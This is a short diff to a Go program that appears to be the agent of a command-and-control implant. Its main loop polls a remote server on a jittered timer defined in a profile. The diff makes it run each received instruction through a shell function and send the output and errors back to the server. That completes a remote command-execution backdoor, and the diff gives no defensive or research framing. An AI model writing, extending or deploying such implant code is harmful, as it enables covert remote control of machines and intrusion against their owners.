@@ -20,13 +20,30 @@ func main() {
 	profile, err := profiles.Load(rawProfile)
 	handleErr(err)
 
-	for range time.Tick(tickAmount(profile.Receive.SleepMin, profile.Receive.SleepMax)) {
+	for range time.Tick(profile.GetTickAmount()) {
 		instruction, err := receive(&profile)
 		if err != nil {
 			fmt.Println("receive error:", err)
 			continue
 		}
 
-		fmt.Println("instruction:", instruction)
+		if len(instruction) == 0 {
+			fmt.Println("empty instruction, skipping...")
+			continue
+		}
+
+		output, err := shell(instruction)
+		if err != nil {
+			if len(output) == 0 {
+				output = err.Error()
+			} else {
+				output += "\n" + err.Error()
+			}
+		}
+
+		if err := send(&profile, &output); err != nil {
+			fmt.Println("send error:", err)
+			continue
+		}
 	}
 }
